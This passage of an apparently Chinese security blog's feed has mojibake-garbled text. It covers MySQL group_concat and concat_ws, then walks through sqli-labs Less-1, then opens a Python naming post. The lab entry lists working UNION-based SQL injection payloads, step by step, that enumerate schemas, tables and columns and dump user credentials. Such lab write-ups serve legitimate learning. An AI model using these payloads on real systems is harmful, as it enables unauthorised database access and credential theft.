class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> doctor   <span class="operator">|</span> passwd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> elite    <span class="operator">|</span> passwd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> basswd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span> vassword <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span> gasswd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> colin    <span class="operator">|</span> passwd   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+</span></span><br><span class="line"><span class="number">11</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>å•ç‹¬ä½¿ç”¨ group_concatï¼Œä¸ä½¿ç”¨ group by æ—¶ï¼Œå°†æ¯ä¸ªè®°å½•ä¸­ usernameå­—æ®µçš„å€¼éƒ½è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨é»˜è®¤åˆ†éš”ç¬¦ï¼šé€—å·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="title function_ invoke__">group_concat</span>(username) <span class="keyword">from</span> tuser;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| <span class="title function_ invoke__">group_concat</span>(username)                                     |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| admin,adam,bob,colin,doc,doctor,elite,admin,adam,bob,colin |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line"><span class="number">1</span> row in <span class="title function_ invoke__">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h3 id="distinct-å­å¥">DISTINCT å­å¥</h3><p>åœ¨ group_concat å°†ç»„ä¸­å€¼è¿æ¥æˆå­—ç¬¦ä¸²ä¹‹å‰ï¼Œå»é™¤ç»„ä¸­é‡å¤çš„å€¼ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(<span class="keyword">distinct</span> username) <span class="keyword">from</span> tuser;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(<span class="keyword">distinct</span> username)       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> adam,admin,bob,colin,doc,doctor,elite <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h3 id="order-by-å­å¥">ORDER BY å­å¥</h3><p>è¿™ä¸ªä½ åº”è¯¥æ¯”è¾ƒæ¸…æ¥šï¼Œå°±æ˜¯æŒ‰ç…§æŒ‡å®šçš„å­—æ®µï¼ˆå¿…é¡»æŒ‡å®šå­—æ®µï¼‰ï¼Œé€’å¢æˆ–é€’å‡æ’åºï¼Œé»˜è®¤æ˜¯é€’å¢çš„ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨è®¾ç½®ï¼Œè·Ÿsql è¯­å¥ä¸­å­¦çš„ order by æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚</p><p>The <code>SEPARATOR</code> specifies a literal value inserted betweenvalues in the group. If you do not specify a separator, the<code>GROUP_CONCAT</code> function uses a comma (,) as the defaultseparator.</p><p>SEPARATOR å­å¥</p><p>æŒ‡å®šå­—ç¬¦ä¸²è¿æ¥å„å€¼æ—¶çš„åˆ†éš”ç¬¦ï¼Œå¦‚æœä¸å†™æ­¤å­å¥ï¼Œé»˜è®¤åˆ†éš”ç¬¦æ˜¯é€—å·ï¼ˆcommaï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(<span class="keyword">distinct</span> username separator <span class="string">&#x27;;&#x27;</span>) <span class="keyword">from</span> tuser;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(<span class="keyword">distinct</span> username separator <span class="string">&#x27;;&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> adam;admin;bob;colin;doc;doctor;elite         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>GROUP_CONCAT å‡½æ•°å¿½ç•¥ NULL å€¼ï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…çš„è¡Œæˆ–è€…æ‰€æœ‰çš„å€¼éƒ½æ˜¯NULLï¼Œå®ƒå°†ä¼šè¿”å› NULLã€‚</p><p>GROUP_CONCATæ ¹æ®å˜é‡/å€¼æ¥è¿”å›äºŒè¿›åˆ¶/éäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚ï¼ˆè¿™å¥è¯çš„æ„æ€å°±æ˜¯å’±ä¸ç”¨ç®¡å®ƒï¼‰ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿”å›å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º1024. å¦‚æœè¦éœ€è¦è¿”å›æ›´é•¿çš„è¯ï¼Œå¯ä»¥é€šè¿‡åœ¨ ä¼šè¯çº§ï¼ˆsessionï¼‰ æˆ–å…¨å±€ï¼ˆglobalï¼‰è®¾ç½®ç³»ç»Ÿå˜é‡ï¼šgroup_concat_max_len æ¥å¢å¤§é•¿åº¦ã€‚</p><h3 id="å¸¸è§é”™è¯¯">å¸¸è§é”™è¯¯</h3><p>group_concat å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–é“¾è¡¨ï¼Œè¿™å°±æ„å‘³ç€ä½ ä¸èƒ½å¤Ÿåœ¨å­æŸ¥è¯¢æ—¶ï¼Œé€šè¿‡in è¿ç®—ç¬¦ä½¿ç”¨ group_concat çš„ç»“æœã€‚</p><h1 id="group_concat-ä¸-group-by-æ­é…">group_concat ä¸ group byæ­é…</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(<span class="keyword">distinct</span> username <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> separator <span class="string">&#x27;;&#x27;</span>) <span class="keyword">from</span> tuser <span class="keyword">group</span> <span class="keyword">by</span> id;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(<span class="keyword">distinct</span> username <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> separator <span class="string">&#x27;;&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> bob;adam;admin                                                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> doc;colin                                                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> elite;doctor                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id group_concat(<span class="keyword">distinct</span> username <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> separator <span class="string">&#x27;;&#x27;</span>) <span class="keyword">from</span> tuser <span class="keyword">group</span> <span class="keyword">by</span> id;</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„ç»“æœï¼Œæ›´ç›´è§‚ï¼Œæˆ‘ä½¿ç”¨æ²¡æœ‰ idï¼Œå°±æ˜¯æƒ³è®©ä½ çŸ¥é“ï¼Œorder byå­—æ®µåçš„è¯ï¼Œå¯ä»¥æ ¹æ®æ²¡æœ‰æŸ¥è¯¢çš„å­—æ®µåè¿›è¡Œæ’åºï¼Œä½†æ˜¯ order byæ•°å­—ï¼ˆå³ï¼šç”¨æ•°å­—ä»£æ›¿å­—æ®µï¼‰çš„è¯ï¼Œæ•°å­—å¯¹åº”å‰é¢ select æŸ¥è¯¢çš„åˆ—ï¼ˆä» 1åˆ°åˆ—çš„ä¸ªæ•°ï¼‰ã€‚</p><h1 id="group_concat-ä¸-concat_ws-æ­é…">GROUP_CONCAT ä¸ CONCAT_WSæ­é…</h1><p>åœ¨è¿›è¡Œ sqlæŸ¥è¯¢æ—¶ï¼ŒäºŒè€…æ­é…é£Ÿç”¨æœ€ä½³ã€‚é€‚ç”¨äºä½ éœ€è¦å­—ç¬¦ä¸²è¿æ¥å¤šä¸ªæ•°æ®æ—¶ï¼Œä½¿ç”¨concat_ws ä½¿ç”¨ä¸€ç§åˆ†éš”ç¬¦å°†ä¸€æ¡è®°å½•ä¸­çš„ä¸åŒå­—æ®µå¯¹åº”æ•°æ®é¡¹åˆ†éš”å¼€ï¼Œç„¶ågroup_concat ä½¿ç”¨å¦ä¸€ç§åˆ†éš”ç¬¦ï¼Œå°†ä¸åŒè®°å½•çš„æ•°æ®åˆ†éš”å¼€ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(concat_ws(<span class="string">&#x27;,&#x27;</span>,username,passwd) <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> separator <span class="string">&#x27;; &#x27;</span>) <span class="keyword">from</span> tuser <span class="keyword">group</span> <span class="keyword">by</span> id;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(concat_ws(<span class="string">&#x27;,&#x27;</span>,username,passwd) <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> separator <span class="string">&#x27;; &#x27;</span>)     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> bob,gasswd; adam,vassword; admin,basswd; bob,gasswd; adam,vassword; admin,basswd <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> colin,passwd; doc,passwd; colin,passwd                                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> elite,passwd; doctor,passwd                                                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>è®°ä¸€ä¸ªè‡ªå·±çŠ¯çš„å°é”™è¯¯ï¼š</p><p>mysql insert çš„æ—¶å€™æŠ¥é”™ï¼ŒERROR 1054 (42S22): Unknown column 'admin'in 'field list'</p><p>ä¸€èˆ¬æ˜¯å­—æ®µç±»å‹ä¸ä½ æ’å…¥çš„ä¸ä¸€è‡´é€ æˆçš„ï¼Œè€Œè¿™åˆå¸¸å¸¸æ˜¯å› ä¸ºï¼Œå­—ç¬¦ä¸²æ²¡æœ‰åŠ å•å¼•å·é€ æˆçš„ã€‚</p><p>æ­¤å¤–ï¼Œä¸‰è€…è¿˜æœ‰ä¸€ä¸ªä¸å¤ªä¸€æ ·çš„åœ°æ–¹ï¼šconcat å’Œ group_concatå‡½æ•°åœ¨è¿æ¥å­—ç¬¦ä¸²æ—¶ï¼Œåªè¦å…¶ä¸­æœ‰ä¸€ä¸ªæ˜¯ nullï¼Œé‚£ä¹ˆå°±è¿”å› nullã€‚è€Œ concat_wså‡½æ•°åˆ™ä¸ä¼šè¿™æ ·ï¼Œä»–ä¼šå¿½ç•¥ nullã€‚</p><p>æµ‹è¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#x27;hello&#x27;,null,&#x27;null&#x27;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| concat(&#x27;hello&#x27;,null,&#x27;null&#x27;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| NULL                        |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat_ws(&#x27;;&#x27;,&#x27;hello&#x27;,null,&#x27;world&#x27;);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| concat_ws(&#x27;;&#x27;,&#x27;hello&#x27;,null,&#x27;world&#x27;) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| hello;world                         |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select group_concat(&#x27;hello&#x27;,null,&#x27;world&#x27;);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| group_concat(&#x27;hello&#x27;,null,&#x27;world&#x27;) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| NULL                               |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h1><blockquote><ul><li><a href="http://www.mysqltutorial.org/mysql-group_concat/">MySQLGROUP_CONCAT Function</a></li><li><ahref="http://www.mysqltutorial.org/sql-concat-in-mysql.aspx">MySQLCONCAT Function</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli_libä¹‹less1</title>
      <link href="/blog/2019/07/25/websec/sql_injection/less1_of_sqli-lib/"/>
      <url>/blog/2019/07/25/websec/sql_injection/less1_of_sqli-lib/</url>
      
        <content type="html"><![CDATA[<p>è™½ç„¶æœ‰ mysqlæ³¨å…¥å¤©ä¹¦ï¼Œä½†æ˜¯æ€»æ„Ÿè§‰è‡ªå·±æ€»ç»“ä¸€ä¸‹ï¼Œå­¦å¾—ä¼šæ›´æ‰å®ï¼Œå†™ç»™è‡ªå·±çœ‹å§ã€‚ä¸‹é¢è§£é‡Šå¹¶ä¸å¤šï¼Œä¸»è¦æ˜¯è®°å½•æµç¨‹ä»¥åŠpayloadã€‚å¯¹ä½ æ¥è¯´ï¼Œä½ åº”è¯¥è‡ªå·±äº²æ‰‹æ•²å‡ºè¿™äº›payloadï¼Œå¹¶ä¸”æ¸…æ¥šåœ°ç†è§£å…¶å«ä¹‰ï¼Œå­¦ä¼šä¸¾ä¸€åä¸‰ã€‚</p><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹">æ£€æµ‹æ³¨å…¥ç‚¹</h2><p>åœ¨ id=1 åé¢åŠ ä¸€ä¸ªè‹±æ–‡å¼•å·ï¼Œå³ï¼š?id=1'</p><p>æŠ¥é”™ï¼š....the right syntax to use near ''1'' LIMIT 0,1' at line 1</p><p>è¿™é‡Œæ³¨æ„ near åé¢æœ€å¤–å›´çš„å¼•å·æ˜¯æŠ¥é”™è¯­å¥å°† sqlè¯­å¥å¼•èµ·æ¥ç”¨çš„ï¼Œæ‰€ä»¥çœŸå®çš„ sql è¯­å¥æ˜¯ï¼š'1'' LIMIT 0,1</p><p>ç”±æ­¤å¯çŸ¥</p><ol type="1"><li>å­—ç¬¦å‹æ³¨å…¥ï¼Œå³ï¼šphp æºç å†™çš„æ˜¯ where id=â€˜$idâ€™</li><li>where æŸ¥è¯¢åé¢è¿˜æœ‰ä¸ª limit ä¸€ä¼šå„¿åŠ ä¸ªæ³¨é‡Šï¼Œæ³¨é‡Šæ‰ä»–ã€‚</li></ol><h2 id="çŒœå­—æ®µæ•°">çŒœå­—æ®µæ•°</h2><p>?id=-1' order by 3 --+ç»“æœä¸ºä¸‰ä¸ªå­—æ®µï¼Œå³ï¼šæ­¤æŸ¥è¯¢è¯­å¥æŸ¥è¯¢äº†ä¸‰ä¸ªå­—æ®µã€‚</p><h2 id="æ³¨å…¥ç›¸å…³ä¿¡æ¯">æ³¨å…¥ç›¸å…³ä¿¡æ¯</h2><p>æ³¨æ„ï¼šè¿™é‡Œ id = -1' ï¼Œå°† 1 æ”¹æˆ-1æ˜¯ä¸ºäº†è®©å‰é¢æŸ¥è¯¢ä¸åˆ°ç»“æœï¼Œè¿™æ ·æŸ¥è¯¢ç»“æœåªæœ‰æˆ‘ä»¬å†™çš„ unionæŸ¥è¯¢åé¢æŸ¥è¯¢å‡ºçš„ç»“æœäº†ã€‚</p><p>æ•°æ®åº“ï¼Œç³»ç»Ÿç‰ˆæœ¬åŠå½“å‰æ•°æ®åº“å, å½“å‰ç™»å½•ç”¨æˆ·ï¼Œmysqlæ•°æ®åº“çš„è·¯å¾„ç­‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,concat_ws(&#x27;</span> , <span class="string">&#x27;, version(), database(), user(), @@datadir, @@version_compile_os),3 --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾: 5.5.53 , security , root@localhost , C:Â , Win32</p><p>è¿™é‡Œæˆ‘ä»¬çŸ¥é“äº†ï¼Œæ•°æ®åº“ç‰ˆæœ¬ï¼š5.5.53ï¼Œå½“å‰æ•°æ®åº“çš„åå­—securityï¼Œå½“å‰ç”¨æˆ·ï¼šrootï¼Œmysql æ•°æ®åº“çš„è·¯å¾„ï¼š C:ï¼Œç³»ç»Ÿç‰ˆæœ¬ï¼šWin32</p><h2 id="çˆ†æ•°æ®åº“å">çˆ†æ•°æ®åº“å</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(distinct schema_name), 3 from information_schema.schemata --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾: Your Loginname:information_schema,challenges,mysql,performance_schema,security,webug,webug_sys,webug_width_byte</p><p>è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹ï¼Œinformation_schema ä¸­çš„ schemata è¡¨ï¼Œå­˜å‚¨ç€ mysqlä¸­æ‰€æœ‰æ•°æ®åº“çš„æ•°æ®ã€‚åŒ…æ‹¬è¡¨åï¼šschema_nameï¼Œå­—ç¬¦é›†ç­‰ã€‚</p><p>çˆ†æ•°æ®åº“åï¼Œæ­£è§„çš„è¯å°±ç”¨ï¼Œinformation_schema ä¸­çš„ schemata è¡¨</p><p>å½“ç„¶ï¼Œä¸æ­£è§„çš„æ–¹æ³•ä¹Ÿæœ‰ï¼Œå¯ä»¥ä½¿ç”¨ information_schema ä¸­çš„ tables è¡¨æˆ–è€… columns è¡¨ã€‚</p><p>å› ä¸º tables å­˜å‚¨ç€ table_schemaå³æ¯å¼ è¡¨ä½äºçš„æ•°æ®åº“ï¼Œè¿™æ ·åˆä¼šæœ‰å¾ˆå¤šé‡å¤çš„ï¼Œæ‰€ä»¥ä½¿ç”¨group_concat(distinct å­—æ®µå)å»é™¤é‡å¤çš„ï¼Œå¹¶å°†å…¶ç»„åˆæˆä¸€ä¸ªä»¥é€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(distinct table_schema), 3 from information_schema.tables --+</span></span><br></pre></td></tr></table></figure><p>columns è¡¨ä¹Ÿæ˜¯ç±»ä¼¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(distinct table_schema), 3 from information_schema.columns --+</span></span><br></pre></td></tr></table></figure><h2 id="çˆ†è¡¨">çˆ†è¡¨</h2><p>åˆ—å‡º security æ•°æ®åº“ä¸­çš„è¡¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(distinct table_name), 3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾: Your Login name:emails,referers,uagents,users</p><p>çˆ†è¡¨ä¸€èˆ¬å°±ç”¨ informtion_schema ä¸­çš„ tablesåˆ—ï¼Œå½“ç„¶ä½ åƒä¸Šé¢çˆ†åº“çš„æ—¶å€™ï¼Œä½¿ç”¨ columns è¡¨ä¸­çš„ table_name å­—æ®µå’Œgroup_concat(distinct å­—æ®µå)</p><p>å›æ˜¾ï¼šYour Login name:emails,referers,uagents,users</p><h2 id="çˆ†åˆ—">çˆ†åˆ—</h2><p>åˆ—å‡º securtiy åº“çš„ users è¡¨ä¸­çš„åˆ—å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼šYour Login name:id,username,password</p><p>å­¦åˆ°äº†æ³¨å…¥åˆ—åçš„æ–¹æ³•ï¼Œåœ¨ columns è¡¨ä¸­ä½¿ç”¨ whereè¯­å¥æŸ¥è¯¢æŸä¸ªæ•°æ®åº“ä¸‹çš„æŸä¸ªè¡¨çš„å­—æ®µåï¼Œå­—æ®µåè‚¯å®šæ˜¯ä¸ä¼šé‡å¤çš„ï¼Œæ‰€ä»¥group_concat ä¸ç”¨ä½¿ç”¨ distinctã€‚</p><h2 id="çˆ†-users-çš„æ•°æ®">çˆ† users çš„æ•°æ®</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,concat_ws(&#x27;</span> , <span class="string">&#x27;, username, password), 3 from security.users --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼šYour Login name:Dumb , Dumb</p><h2 id="æ€»ç»“å›é¡¾">æ€»ç»“å›é¡¾ï¼š</h2><ol type="1"><li>å­¦åˆ°äº†å¦‚ä½•æ³¨å…¥åˆ—åï¼Œå¯ä»¥å¯¹ webug æ˜¾é”™æ³¨å…¥çš„æµç¨‹è¿›è¡Œæ”¹è¿›ã€‚</li><li>éœ€è¦ç³»ç»Ÿåœ°å­¦ä¹ å¹¶æ€»ç»“ä¸€ä¸‹ mysql çš„ç³»ç»Ÿæ•°æ®åº“ï¼Œå°¤å…¶æ˜¯information_schema ä¸­çš„è¡¨ï¼Œå¹¶æ¥ä¸€ç¯‡ç¬”è®°</li><li>å¯¹æ³¨å…¥æµç¨‹æ›´åŠ æ¸…æ™°äº†ï¼Œå†æŠŠ sql æ³¨å…¥ä»‹ç»é‚£ç¯‡åšæ–‡åŠ ä¸Š sqlæ³¨å…¥æµç¨‹ã€‚</li></ol><p>æ¨èæ–‡ç« ï¼š</p><p><a href="https://zhuanlan.zhihu.com/p/22397620">ä½ çœŸçš„ä¼š SQLæ³¨å…¥æ”»å‡»å—ï¼Ÿï¼ˆä¸‹ï¼‰</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python å‘½åè§„èŒƒ</title>
      <link href="/blog/2019/07/25/programming/python/name_conventions/"/>
      <url>/blog/2019/07/25/programming/python/name_conventions/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>ä»£ç è§„èŒƒæ˜¯ä¸€ç³»åˆ—ç”¨æ¥äº§ç”Ÿå¯ç»´æŠ¤ï¼Œå¯æ‰©å±•ä»£ç çš„æŒ‡å—ã€‚ä½ ç¼–å†™çš„ä»£ç çš„è§„èŒƒç¨‹åº¦å†³å®šäº†ä½ åœ¨è½¯ä»¶å¼€å‘é¢†åŸŸçš„èŒä¸šç”Ÿæ¶¯çš„å¯¿å‘½ã€‚æˆ‘ä»Python PEP8æ–‡æ¡£ä¸­è·å–äº†è¿™äº›ä»£ç å‘½åè§„èŒƒä¿¡æ¯ï¼Œå¹¶å°è¯•ç”¨ç®€å•æ˜äº†çš„è¯­è¨€è®²è¿°ï¼Œä»¥ä¾¿ä½¿å¾—è¯»è€…æ›´å®¹æ˜“ç†è§£ä¸æ¶ˆåŒ–ã€‚é€šè¿‡æœ¬æ–‡çš„ä¿¡æ¯ï¼Œä½ å¯ä»¥ç¡®ä¿ä»£ç çš„è´¨é‡ï¼Œå¯è¯»æ€§å’Œé‡ç”¨æ€§ã€‚</p><p>ä½ å¯ä»¥é€šè¿‡æŸ¥é˜… <ahref="https://www.techbeamers.com/python-code-optimization-tips-tricks/"><strong>Pythoncode optimization</strong></a> æ¥æé«˜ä½ æ‰€ç¼–å†™çš„ Pythonåº”ç”¨ç¨‹åºçš„ä»£ç æ€§èƒ½ä¸å¥å£®æ€§ã€‚æ­¤å¤–ï¼ŒGithub ä¸Šçš„ python-guideé¡¹ç›®ä¸­å…³äºä»£ç å®è·µçš„éƒ¨åˆ† <ahref="https://docs.python-guide.org/#writing-great-python-code">WritingGreat Python Code</a>ï¼Œä½ ä¹Ÿä¸èƒ½é”™è¿‡ã€‚</p><p>è¯·è®°ä½ï¼šå‘½åè§„èŒƒåªæ˜¯è®¸å¤š Python ç¼–ç æ ‡å‡†çš„ä¸€ä¸ªæ–¹é¢ã€‚ä½ å¯ä»¥åœ¨<ahref="https://www.python.org/dev/peps/pep-0008/"><strong>PEP8documentation</strong></a> è¯»åˆ°å…¶ä»–çš„æ–¹é¢ã€‚</p><ul class="task-list"><li><label><input type="checkbox" />Pythonå…¶ä»–æ–¹é¢çš„ç¼–ç æ ‡å‡†</label></li></ul><h2 id="åº”è¯¥é¿å…çš„åç§°">åº”è¯¥é¿å…çš„åç§°</h2><ul><li>å•å­—ç¬¦åç§°, é™¤äº†è®¡æ•°å™¨å’Œè¿­ä»£å™¨.</li><li>åŒ…/æ¨¡å—åä¸­çš„è¿å­—ç¬¦(<code>-</code>)</li><li>åŒä¸‹åˆ’çº¿å¼€å¤´å¹¶ç»“å°¾çš„åç§°(Python ä¿ç•™,ä¾‹å¦‚<code>__init__</code>)</li></ul><h2 id="å‘½åçº¦å®š">å‘½åçº¦å®š</h2><ul><li>æ‰€è°“â€å†…éƒ¨(Internal)â€è¡¨ç¤ºä»…æ¨¡å—å†…å¯ç”¨, æˆ–è€…,åœ¨ç±»å†…æ˜¯ä¿æŠ¤æˆ–ç§æœ‰çš„.</li><li>ç”¨å•ä¸‹åˆ’çº¿(<code>_</code>)å¼€å¤´è¡¨ç¤ºæ¨¡å—å˜é‡æˆ–å‡½æ•°æ˜¯ protected çš„(ä½¿ç”¨<code>from module import *</code> 